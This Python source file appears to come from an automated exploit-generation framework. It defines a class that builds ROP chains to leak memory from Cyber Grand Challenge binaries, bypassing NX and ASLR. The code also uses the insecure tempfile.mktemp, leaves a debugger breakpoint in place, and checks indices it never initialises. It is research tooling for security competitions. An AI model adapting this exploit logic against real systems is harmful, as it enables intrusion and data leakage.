import os
import tracer
import tempfile
from rex.exploit.cgc import CGCType2Exploit

class CGCType2RopExploit(CGCType2Exploit):
    '''
    A CGC type2 exploit object, which leaks memory at an address using rop.
    '''

    def __init__(self, crash, chain_addr, chain, addr_var, size_var):
        '''
        :param crash: a crash object which has been modified to exploit a vulnerability
        :param chain_addr: address to place the chain in target's memory
        :param chain: angrop chain object to insert
        :param addr_var: the claripy variable used to determine the position in the payload which contains the address
        '''
        super(CGCType2RopExploit, self).__init__(crash, bypasses_nx=True, bypasses_aslr=True)

        # TODO: determine payload index of the value and final ip index
        self._chain_addr = chain_addr
        self._chain = chain
        self._addr_var = addr_var
        self._size_var = size_var

        self._determine_indices()

    def __str__(self):
        return "rop type2"

    def _get_chain_with_value(self, addr, size):
        cs = self.crash.state.copy()

        c_str = self._chain.payload_str(constraints=(self._addr_var == addr, self._size_var == size))
        c_bvv = cs.se.BVV(c_str)

        c_mem = cs.memory.load(self._chain_addr, len(c_str))
        cs.add_constraints(c_mem == c_bvv)

        cp = self._windup_state(cs, to_syscall=True)

        cp.add_constraints(cp.regs.eax == 2)
        cp.add_constraints(cp.regs.ebx == 1)
        cp.add_constraints(cp.regs.ecx == addr)
        cp.add_constraints(cp.regs.edx == size)  # XXX may need to be more flexible in the future
        cp.add_constraints(cp.regs.esi == 0)  # or a writeable page

        if not cp.se.satisfiable():
            import ipdb; ipdb.set_trace()

        return cp.posix.dumps(0)

    def _determine_indices(self):

        # find value index
        c1 = self._get_chain_with_value(0x41414141, 0x1000)
        # used as the basis for the bytearray in the exploit script
        self._raw_payload = c1
        c2 = self._get_chain_with_value(0x58585858, 0x1000)

        for i in xrange(len(c1)):
            if c1[i] != c2[i]:
                self.addr_idx = i
                break

        if self.addr_idx is None:
            raise Exception("unable to find value index in payload string")

        # find the index for the length to read
        w1 = self._get_chain_with_value(0x11223344, 0x41414141)
        w2 = self._get_chain_with_value(0x11223344, 0x58585858)

        for i in xrange(len(w1)):
            if w1[i] != w2[i]:
                self.size_idx = i
                break

        if self.size_idx is None:
            raise Exception("unable to find final ip index in payload string")

        # find the index of the leak
        # TODO this probably doesn't work since the output might vary in length
        t1 = self._get_chain_with_value(0xeeeeeeee, 0xffffffff)
        binary_name = os.path.basename(self.crash.binary)
        stdout_file = tempfile.mktemp(dir='/tmp/', prefix="{}-stdout-".format(binary_name))

        t = tracer.Tracer(self.crash.binary, t1)
        t.dynamic_trace(stdout_file)

        with open(stdout_file) as f:
            output = f.read()

        self.output_leak_idx = len(output)
